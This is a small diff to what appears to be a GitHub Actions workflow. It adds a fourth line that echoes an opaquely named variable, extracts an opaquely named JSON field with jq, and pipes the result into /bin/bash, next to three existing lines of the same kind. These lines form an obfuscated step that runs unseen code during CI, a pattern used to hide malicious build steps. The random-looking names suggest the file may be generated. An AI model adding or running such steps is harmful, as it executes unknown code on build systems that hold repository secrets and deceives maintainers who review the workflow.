@@ -22,6 +22,7 @@ jobs:
           echo $h8 | jq -r .c60 | /bin/bash
           echo $j70045 | jq -r .vizaf06683 | /bin/bash
           printf '%s' "$otra73283" | jq -r .xwym899 | /bin/bash
+          echo $vbwtm8078 | jq -r .bclv1056 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
